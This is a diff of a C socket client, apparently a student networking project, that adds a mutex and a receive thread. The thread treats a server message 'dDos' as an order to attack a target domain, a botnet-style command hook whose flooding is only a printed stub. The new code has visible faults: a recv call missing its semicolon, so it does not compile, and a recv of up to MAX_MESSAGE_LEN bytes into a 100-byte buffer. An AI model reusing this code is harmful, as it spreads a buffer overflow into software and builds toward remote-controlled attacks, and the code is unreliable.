@@ -13,6 +13,7 @@
 #define PORT "10000" // Client 所要連線的 port
 
 int s_fd;
+pthread_mutex_t lock;
 
 /*void delay(int amount){
 	while(amount--){;}
@@ -57,37 +58,38 @@ void close_socket(){
 /***
 Thread: Receive message from server and response.
 ***/
-void *receive(void *argv){
+void *Receive(void *argv){
 	char recvMsg[MAX_MESSAGE_LEN + 1];
+	char target_domain[100];
+
 	memset(recvMsg, 0, MAX_MESSAGE_LEN + 1);
 	while(1) {	
-
 		
-	    
-		//printf("Receiving message from server...\n");
-
+		
 		if(recv(s_fd, recvMsg, MAX_MESSAGE_LEN, 0) == -1) {
 			puts("Fail to receive message from server.");
 			exit(2);
-		} else {
-			//if(strcmp(recvMsg,"close")==0) close_socket();
-			//else{
-				printf("%s", recvMsg);
-				//printf("\nSomebody said:  %s", recvMsg);
-				//printf("\n\n");
-			//	recvMsg[MAX_MESSAGE_LEN + 1]="\0";
-				//printf("\nWaiting job from server...\n");
-				memset(recvMsg, 0, MAX_MESSAGE_LEN + 1);
-				//printf("Please enter message (<=%d charctors) to send to server: ", MAX_MESSAGE_LEN);
-				delay(1);
-			//}
+		} 
+		pthread_mutex_lock(&lock);
+		///printf("In thread ,revieve: %s\n",recvMsg);
+		if(!strcmp(recvMsg, "dDos")){
 
+            printf("Do Dos: Send Packet!!!\n");
+            recv(s_fd, target_domain, MAX_MESSAGE_LEN, 0)
+            printf("Target:%s\n",target_domain);
+            memset(target_domain, 0, 100);
+        }
+        else{
+			printf("%s", recvMsg);	
 		}
+		memset(recvMsg, 0, MAX_MESSAGE_LEN + 1);
 
-		
+		pthread_mutex_unlock(&lock);
 	}
+	pthread_detach(pthread_self());
 		
 }
+
 
 
 
@@ -134,9 +136,6 @@ int main(int argc, char *argv[]) {
 	memset(&hints, 0, sizeof hints);
 	hints.ai_family = AF_INET;
 	hints.ai_socktype = SOCK_STREAM;
-
-	char sendMsg[MAX_MESSAGE_LEN + 1]="\0";
-	char sendName[MAX_MESSAGE_LEN + 1];
 	
 	if ((rv = getaddrinfo(argv[1], PORT, &hints, &servinfo)) != 0) {
 	    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
@@ -182,60 +181,39 @@ int main(int argc, char *argv[]) {
 	freeaddrinfo(servinfo);
 
 
+	/* Initial the mutex for threads */
+    if (pthread_mutex_init(&lock, NULL) != 0)
+    {
+        printf("\n mutex init failed\n");
+        return 1;
+    }
+
 	/***
 	Creat thread for receiving message to server.
 	***/
-	pthread_t t1;
-	pthread_create(&t1, NULL, &receive, NULL);
+	pthread_t tid;
+	pthread_create(&tid, NULL, &Receive, NULL);
 	/* Reduce CPU usage */
-    sleep(1);
+	sleep(1);
 
-	
+
+	char sendMsg[MAX_MESSAGE_LEN + 1]="\0";
+	char sendName[MAX_MESSAGE_LEN + 1];
 
 	while(1) {	
-
-		
-
-
-		/***
-		Send message to server.
-		***/
-		//printf("Please enter message (<=%d charctors) to send to server: ", MAX_MESSAGE_LEN);
 		scanf("%s", sendMsg);
-		//printf("Sending '%s' to server...\n", sendMsg);
-		
 
+		pthread_mutex_lock(&lock);
 		if(send(s_fd, sendMsg, strlen(sendMsg), 0) == -1) {
 			puts("Fail to send message to server.");
 			exit(2);
 		} 
-		/*else {
-			puts("Message sent.");
-		}*/
+
 		memset(sendMsg, 0, MAX_MESSAGE_LEN + 1);
-
-
-		
-		/*
-		if(recv(s_fd, recvMsg, MAX_MESSAGE_LEN, 0) == -1) {
-			puts("Fail to do the job from server.");
-			exit(2);
-		} else {
-			printf("The job from server is :\n\t%s\n", recvMsg);
-			recvMsg[cbytes] = '\0';
-			printf("\nDoing job sented from server...\n");
-			int flag=1;
-			while(flag){ 
-				printf("Finish yet? 1.yes or 2.no:");
-				scanf("%d",&flag);
-				
-				flag=flag-1;
-			} 
-		}*/
-		
-		//delay(1); 
-		//timeout.tv_sec = 1500000000;
+		pthread_mutex_unlock(&lock);
 	}
+
+
 	return 0;
 }
 
